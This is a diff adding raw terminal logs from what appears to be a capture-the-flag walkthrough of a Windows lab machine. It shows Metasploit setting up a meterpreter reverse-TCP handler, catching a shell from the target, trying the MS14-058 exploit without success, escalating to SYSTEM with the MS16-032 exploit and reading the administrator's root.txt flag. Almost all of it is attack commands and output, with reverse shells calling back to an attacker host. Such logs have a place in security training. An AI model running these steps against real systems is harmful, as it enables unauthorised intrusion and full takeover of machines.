@@ -86,3 +86,345 @@ dir
 
 C:\Users\kostas\Desktop>
 
+C:\Users\kostas\Desktop>background
+
+Background session 1? [y/N]  y
+msf5 > use multi/handler
+[*] Using configured payload windows/x64/shell/reverse_tcp
+
+======================
+
+
+hippoeug@kali:~$ msfconsole
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v5.0.99-dev                          ]
++ -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: You can upgrade a shell to a Meterpreter session on many platforms using sessions -u <session_id>
+
+msf5 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:                                                                                                                                                       
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(multi/handler) > set lport 4545
+lport => 4545
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4545 
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*] Meterpreter session 1 opened (10.10.14.15:4545 -> 10.10.10.8:49204) at 2021-01-17 14:22:40 +0800
+
+meterpreter > 
+
+============================
+
+C:\Users\kostas\Desktop>meterpreter.exe
+meterpreter.exe
+
+C:\Users\kostas\Desktop>
+
+====================
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > 
+
+================
+
+msf5 > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x64/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.15:4545 -> 10.10.10.8:49204 (10.10.10.8)
+
+msf5 > 
+
+
+=======================
+
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+   1   Windows x64
+
+
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set target 1
+target => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows x64
+
+
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4646
+lport => 4646
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
+session => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4646 
+[-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system.
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > back
+msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+   1   Windows x64
+
+
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
+target => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows x64
+
+
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4646
+lport => 4646
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set sessoin 1
+sessoin => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT     4646             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows x64
+
+
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4646 
+[+] Compressed size: 1016
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3600
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 1176
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 1232
+[+] Resuming thread..
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+TJn8TusTEgQYWSVvMHKkkWIl2Ff4BM8N
+[+] Executed on target machine.
+[*] Sending stage (176195 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.15:4646 -> 10.10.10.8:49205) at 2021-01-17 14:27:43 +0800
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1
+
+meterpreter > dir
+Listing: C:\Users\kostas\Desktop
+================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  282     fil   2017-03-18 19:57:16 +0800  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 19:58:52 +0800  hfs.exe
+100777/rwxrwxrwx  7168    fil   2021-01-23 22:59:49 +0800  meterpreter.exe
+
+meterpreter > cd..
+[-] Unknown command: cd...
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > dir
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   8192  dir   2017-03-18 19:52:50 +0800  Administrator
+40777/rwxrwxrwx   0     dir   2013-08-22 22:48:41 +0800  All Users
+40555/r-xr-xr-x   0     dir   2013-08-22 21:36:16 +0800  Default
+40777/rwxrwxrwx   0     dir   2013-08-22 22:48:41 +0800  Default User
+40555/r-xr-xr-x   4096  dir   2013-08-22 21:36:16 +0800  Public
+100666/rw-rw-rw-  174   fil   2013-08-22 23:39:32 +0800  desktop.ini
+40777/rwxrwxrwx   8192  dir   2017-03-18 19:57:09 +0800  kostas
+
+meterpreter > cd Administrator
+meterpreter > dir
+Listing: C:\Users\Administrator
+===============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:50 +0800  AppData
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  Application Data
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:56 +0800  Contacts
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  Cookies
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Desktop
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Documents
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Downloads
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Favorites
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Links
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  Local Settings
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Music
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  My Documents
+100666/rw-rw-rw-  524288  fil   2017-03-18 19:52:50 +0800  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2017-03-18 19:52:51 +0800  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TM.blf
+100666/rw-rw-rw-  524288  fil   2017-03-18 19:52:51 +0800  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2017-03-18 19:52:51 +0800  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  NetHood
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Pictures
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  PrintHood
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  Recent
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Saved Games
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:56 +0800  Searches
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  SendTo
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  Start Menu
+40777/rwxrwxrwx   0       dir   2017-03-18 19:52:51 +0800  Templates
+40555/r-xr-xr-x   0       dir   2017-03-18 19:52:50 +0800  Videos
+100666/rw-rw-rw-  90112   fil   2017-03-18 19:52:51 +0800  ntuser.dat.LOG1
+100666/rw-rw-rw-  102400  fil   2017-03-18 19:52:51 +0800  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2017-03-18 19:52:51 +0800  ntuser.ini
+
+meterpreter > cd Desktop
+meterpreter > dir
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-03-18 19:52:56 +0800  desktop.ini
+100444/r--r--r--  32    fil   2017-03-18 20:13:57 +0800  root.txt
+
+meterpreter > cat root.txt
+51ed1b36553c8461f4552c2e92b3eeedmeterpreter > 
